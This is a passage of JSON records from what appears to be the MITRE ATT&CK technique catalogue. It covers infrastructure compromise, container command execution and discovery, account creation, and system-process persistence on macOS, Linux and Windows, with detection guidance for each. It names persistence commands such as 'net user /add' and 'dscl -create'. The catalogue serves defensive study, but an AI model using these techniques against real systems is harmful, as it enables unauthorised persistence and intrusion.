{"ID":"T1584.004","name":"Compromise Infrastructure: Server","description":"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.","url":"https://attack.mitre.org/techniques/T1584/004","created":"01 October 2020","last modified":"13 April 2023","version":"1.2","tactics":"Resource Development","detection":"Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":"Dor Edry, Microsoft","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Lazarus Jul 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Talos TinyTurla September 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Recorded Future Turla Infra 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Accenture HyperStack October 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: FireEye EPS Awakens Part 2),(Citation: ClearSky Lazarus Aug 2020),(Citation: McAfee Night Dragon),"}
{"ID":"T1584.007","name":"Compromise Infrastructure: Serverless","description":"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)","url":"https://attack.mitre.org/techniques/T1584/007","created":"08 July 2022","last modified":"20 October 2022","version":"1.0","tactics":"Resource Development","detection":null,"platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":"Awake Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1584.003","name":"Compromise Infrastructure: Virtual Private Server","description":"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.","url":"https://attack.mitre.org/techniques/T1584/003","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NSA NCSC Turla OilRig),"}
{"ID":"T1584.006","name":"Compromise Infrastructure: Web Services","description":"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.","url":"https://attack.mitre.org/techniques/T1584/006","created":"01 October 2020","last modified":"12 April 2023","version":"1.2","tactics":"Resource Development","detection":"Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":"Dor Edry, Microsoft","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Recorded Future Turla Infra 2020),(Citation: TrendMicro EarthLusca 2022),"}
{"ID":"T1609","name":"Container Administration Command","description":"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)","url":"https://attack.mitre.org/techniques/T1609","created":"29 March 2021","last modified":"15 April 2023","version":"1.2","tactics":"Execution","detection":"Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster. ","platforms":"Containers","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; Brad Geesaman, @bradgeesaman; Center for Threat-Informed Defense (CTID); David Fiser, @anu4is, Trend Micro; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Aqua Kinsing April 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Peirates GitHub),(Citation: Kubernetes Security Context),(Citation: Kubernetes Hardening Guide),(Citation: Kubernetes API Control Access),(Citation: Kubernetes RBAC),(Citation: Microsoft AKS Azure AD 2023),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Admission Controllers),(Citation: Kubernetes Cloud Native Security)"}
{"ID":"T1613","name":"Container and Resource Discovery","description":"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ","url":"https://attack.mitre.org/techniques/T1613","created":"31 March 2021","last modified":"15 April 2023","version":"1.1","tactics":"Discovery","detection":"Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.\n\nMonitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. ","platforms":"Containers","data sources":"Container: Container Enumeration, Pod: Pod Enumeration","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Peirates GitHub),(Citation: Unit 42 Hildegard Malware),(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Kubernetes API Control Access),(Citation: Kubernetes RBAC),(Citation: Microsoft AKS Azure AD 2023),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Cloud Native Security)"}
{"ID":"T1136","name":"Create Account","description":"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.","url":"https://attack.mitre.org/techniques/T1136","created":"14 December 2017","last modified":"12 April 2023","version":"2.3","tactics":"Persistence","detection":"Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\n\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Network, Office 365, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, User Account: User Account Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Microsoft Threat Intelligence Center (MSTIC); Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Symantec WastedLocker June 2020),"}
{"ID":"T1136.003","name":"Create Account: Cloud Account","description":"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).","url":"https://attack.mitre.org/techniques/T1136/003","created":"29 January 2020","last modified":"06 March 2023","version":"1.3","tactics":"Persistence","detection":"Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"User Account: User Account Creation","is sub-technique":true,"sub-technique of":"T1136","defenses bypassed":null,"contributors":"Microsoft Threat Intelligence Center (MSTIC); Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC Nobelium Oct 2021),(Citation: AADInternals Documentation),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1136.002","name":"Create Account: Domain Account","description":"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","url":"https://attack.mitre.org/techniques/T1136/002","created":"28 January 2020","last modified":"23 March 2020","version":"1.0","tactics":"Persistence","detection":"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, User Account: User Account Creation","is sub-technique":true,"sub-technique of":"T1136","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Microsoft GALLIUM December 2019),(Citation: Cybereason Soft Cell June 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Github PowerShell Empire),(Citation: NCC Group Fivehands June 2021),(Citation: Savill 1999),(Citation: GitHub Pupy),"}
{"ID":"T1136.001","name":"Create Account: Local Account","description":"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>.(Citation: cisco_username_cmd)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","url":"https://attack.mitre.org/techniques/T1136/001","created":"28 January 2020","last modified":"12 April 2023","version":"1.2","tactics":"Persistence","detection":"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, User Account: User Account Creation","is sub-technique":true,"sub-technique of":"T1136","defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: aptsim),(Citation: Symantec Leafminer July 2018),(Citation: Trustwave GoldenSpy June 2020),(Citation: Kaspersky Flame Functionality),(Citation: US-CERT TA18-074A),(Citation: FireEye APT41 Aug 2019),(Citation: Proofpoint TA505 Jan 2019),(Citation: Github PowerShell Empire),(Citation: Intezer HiddenWasp Map 2019),(Citation: Talos ZxShell Oct 2014),(Citation: Unit 42 Hildegard Malware),(Citation: Savill 1999),(Citation: BitDefender Chafer May 2020),(Citation: Symantec Calisto July 2018),(Citation: Intezer TeamTNT September 2020),(Citation: Kaspersky Flame),(Citation: Cylance Dust Storm),(Citation: ClearSky Pay2Kitten December 2020),(Citation: KISA Operation Muzabi),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye CARBANAK June 2017),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: GitHub Pupy),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1543","name":"Create or Modify System Process","description":"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ","url":"https://attack.mitre.org/techniques/T1543","created":"10 January 2020","last modified":"20 April 2022","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Driver: Driver Load, File: File Creation, File: File Modification, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ANSSI Sandworm January 2021),(Citation: Malicious Driver Reporting Center),(Citation: Microsoft driver block rules)"}
{"ID":"T1543.001","name":"Create or Modify System Process: Launch Agent","description":"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ","url":"https://attack.mitre.org/techniques/T1543/001","created":"17 January 2020","last modified":"21 April 2022","version":"1.4","tactics":"Persistence, Privilege Escalation","detection":"Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\nEnsure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy. ","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Service: Service Creation, Service: Service Modification","is sub-technique":true,"sub-technique of":"T1543","defenses bypassed":null,"contributors":"Antonio Piazza, @antman1p","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist Calisto July 2018),(Citation: TrendMicro macOS Dacls May 2020),(Citation: CheckPoint Dok),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: synack 2016 review),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: objsee mac malware 2017),(Citation: CoinTicker 2019),(Citation: Objective-See MacMa Nov 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: wardle evilquest parti),(Citation: Sofacy Komplex Trojan),(Citation: ESET DazzleSpy Jan 2022),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: TrendMicro MacOS April 2018),(Citation: piazza launch agent mitigation)"}
{"ID":"T1543.004","name":"Create or Modify System Process: Launch Daemon","description":"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)","url":"https://attack.mitre.org/techniques/T1543/004","created":"17 January 2020","last modified":"30 March 2023","version":"1.2","tactics":"Persistence, Privilege Escalation","detection":"Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.\n\nSome legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present.(Citation: launchd Keywords for plists)\n\n","platforms":"macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification","is sub-technique":true,"sub-technique of":"T1543","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, root","relationship citations":"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: wardle evilquest parti),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: ESET LoudMiner June 2019),(Citation: TrendMicro MacOS April 2018),(Citation: TrendMicro macOS Dacls May 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA AppleJeus Feb 2021),"}
{"ID":"T1543.002","name":"Create or Modify System Process: Systemd Service","description":"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`). (Citation: lambert systemd 2022) \n\nService unit files use the following directives to execute system commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives cover execution of commands when a service is started manually by `systemctl`, or on system start if the service is set to automatically start.\n* `ExecReload` directive covers when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives cover when a service is stopped.  \n\nAdversaries may abuse systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files systemd uses upon reboot or starting a service.(Citation: Anomali Rocke March 2019) Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.\n\nThe `.service` file’s `User` directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.(Citation: Rapid7 Service Persistence 22JUNE2016) ","url":"https://attack.mitre.org/techniques/T1543/002","created":"17 January 2020","last modified":"12 April 2023","version":"1.3","tactics":"Persistence, Privilege Escalation","detection":"Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for `root` & `user` level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the `root` user.(Citation: lambert systemd 2022) \n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: `systemctl list-units -–type=service –all`. Analyze the contents of `.service` files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links.(Citation: Berba hunting linux systemd)\n\nAuditing the execution and command-line arguments of the `systemctl` utility, as well related utilities such as `/usr/sbin/service` may reveal malicious systemd service execution.","platforms":"Linux","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification","is sub-technique":true,"sub-technique of":"T1543","defenses bypassed":null,"contributors":"Emad Al-Mousa, Saudi Aramco; Tony Lambert, Red Canary","permissions required":"root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Lunghi Iron Tiger Linux),(Citation: Anomali Rocke March 2019),(Citation: ANSSI Sandworm January 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Fysbis Dr Web Analysis),(Citation: Unit 42 Hildegard Malware),(Citation: ESET TeleBots Oct 2018),(Citation: GitHub Pupy),(Citation: Trend Micro TeamTNT),"}
{"ID":"T1543.003","name":"Create or Modify System Process: Windows Service","description":"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).","url":"https://attack.mitre.org/techniques/T1543/003","created":"17 January 2020","last modified":"21 April 2023","version":"1.3","tactics":"Persistence, Privilege Escalation","detection":"Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be 